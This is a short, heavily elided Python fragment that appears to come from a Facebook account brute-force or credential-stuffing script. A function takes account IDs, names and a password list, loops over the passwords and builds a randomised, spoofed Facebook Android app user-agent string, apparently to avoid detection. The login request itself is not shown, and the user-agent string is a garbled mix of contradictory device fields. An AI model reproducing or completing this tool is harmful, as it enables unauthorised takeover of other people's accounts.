...
def api1(ids,names,passlist):
        try:
            ...
            for pw in passlist:
                ...
                ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FB4A/;FBAV/;FBBV/743004060;FBAN/FB4A;FBAV/;FBBV/743004060;FBDM//*{density=1.5,width=1440,height=4096};FBLC/de_DE;FBRV/316677432;FBCR/TECNO;FBMF/OnePlus;FBBD/Blackview;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_12Z;FBSV/11;FBOP/5;FBCA/armeabi;FBSS/15;]"
                li = ['28','29','210']
